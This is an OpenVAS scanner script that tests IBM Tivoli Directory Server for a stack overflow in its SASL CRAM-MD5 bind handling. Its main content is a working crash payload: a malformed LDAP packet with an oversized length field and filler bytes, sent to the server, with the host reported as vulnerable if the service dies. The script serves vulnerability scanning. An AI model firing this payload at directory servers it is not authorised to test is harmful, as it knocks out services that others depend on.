###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ibm_tivoli_dir_server_code_exec_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# IBM Tivoli Directory Server SASL Bind Request Remote Code Execution Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow remote attackers to execute arbitrary
  code within the context of the affected application or retrieve potentially
  sensitive information.
  Impact Level: Application";
tag_affected = "IBM Tivoli Directory Server 5.2 before 5.2.0.5-TIV-ITDS-IF0010,
  6.0 before 6.0.0.67 (6.0.0.8-TIV-ITDS-IF0009),
  6.1 before 6.1.0.40 (6.1.0.5-TIV-ITDS-IF0003),
  6.2 before 6.2.0.16 (6.2.0.3-TIV-ITDS-IF0002),
  and 6.3 before 6.3.0.3";
tag_insight = "The flaw is caused by a stack overflow error in the 'ibmslapd.exe' component
  when allocating a buffer via the 'ber_get_int()' function within
  'libibmldap.dll' while handling LDAP CRAM-MD5 packets, which could be
  exploited by remote unauthenticated attackers to execute arbitrary code with
  SYSTEM privileges.";
tag_solution = "Apply patches
  https://www-304.ibm.com/support/docview.wss?uid=swg24029672
  https://www-304.ibm.com/support/docview.wss?uid=swg24029663
  https://www-304.ibm.com/support/docview.wss?uid=swg24029661
  https://www-304.ibm.com/support/docview.wss?uid=swg24029660";
tag_summary = "The host is running IBM Tivoli Directory Server and is prone
  to remote code execution vulnerability.";

if(description)
{
  script_id(902507);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-05-02 12:20:04 +0200 (Mon, 02 May 2011)");
  script_cve_id("CVE-2011-1206", "CVE-2011-1820");
  script_bugtraq_id(47121);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_name("IBM Tivoli Directory Server SASL Bind Request Remote Code Execution Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Determine IBM Tivoli Directory Server Remote Code Execution Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/ldap", 389);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://secunia.com/advisories/44184");
  script_xref(name : "URL" , value : "http://securitytracker.com/id?1025358");
  script_xref(name : "URL" , value : "http://www.1337day.com/exploits/15889");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17188/");
  exit(0);
}


include("ldap.inc");

## Get LDAP Port
port = get_kb_item("Services/ldap");
if(!port) {
  port = 389;
}

## Check Port Status
if(!get_port_state(port)){
  exit(0);
}

if(! ldap_alive(port:port)){
  exit(0);
}

## LDAP SASL Bind Request
data = raw_string(0x30, 0x18, 0x02, 0x01, 0x01, 0x60, 0x13, 0x02,
                  0x01, 0x03, 0x04, 0x00, 0xa3, 0x0c, 0x04, 0x08,
                  0x43, 0x52, 0x41, 0x4d, 0x2d, 0x4d, 0x44, 0x35,
                  0x04, 0x00);

attack = raw_string(0x30, 0x82, 0x01, 0x41, 0x02, 0x01, 0x02, 0x60,
                    0x82, 0x01, 0x3a, 0x02, 0x01, 0x03, 0x04, 0x00,
                    0xa3, 0x82, 0x01, 0x31, 0x04, 0x08, 0x43, 0x52,
                    0x41, 0x4d, 0x2d, 0x4d, 0x44, 0x35, 0x04, 0x84,
                    0xff, 0xff, 0xff, 0xff) +
         crap(data:raw_string(0x41), length: 256) +
         raw_string(0x20, 0x36, 0x61, 0x37, 0x61, 0x31, 0x31, 0x34,
                    0x39, 0x36, 0x30, 0x33, 0x61, 0x64, 0x37, 0x64,
                    0x30, 0x33, 0x34, 0x39, 0x35, 0x66, 0x39, 0x65,
                    0x37, 0x31, 0x34, 0x66, 0x34, 0x30, 0x66, 0x31,
                    0x63);

## Open TCP Socket
soc = open_sock_tcp(port);
if(! soc){
  exit(0);
}

## Sending Exploit
send(socket:soc, data:data);
res = recv(socket:soc, length:128);
send(socket:soc, data:attack);
res = recv(socket:soc, length:128);

## Check Port status
if(! ldap_alive(port:port)){
  security_hole(port);
}
